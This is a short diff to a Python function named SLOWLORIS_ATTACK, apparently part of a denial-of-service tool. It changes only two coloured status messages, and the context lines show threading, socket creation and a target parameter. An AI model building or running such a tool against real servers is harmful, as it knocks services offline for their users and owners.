@@ -61,7 +61,7 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 				except socket.error:
 					print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to create socket!")
 				else:
-					print("\033[1;34m"+"[*]"+"\033[0m"+" Sending to " + target + "...")
+					print("\033[1;34m"+"[*]"+"\033[0m"+" Sending packets to " + target + "...")
 
 	# Start threads
 	for thread in range(0, threads):
@@ -76,4 +76,4 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("\033[1;33m"+"[!]"+"\033[0m"+" SLOWLORIS attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" SLOWLORIS attack stopped.")
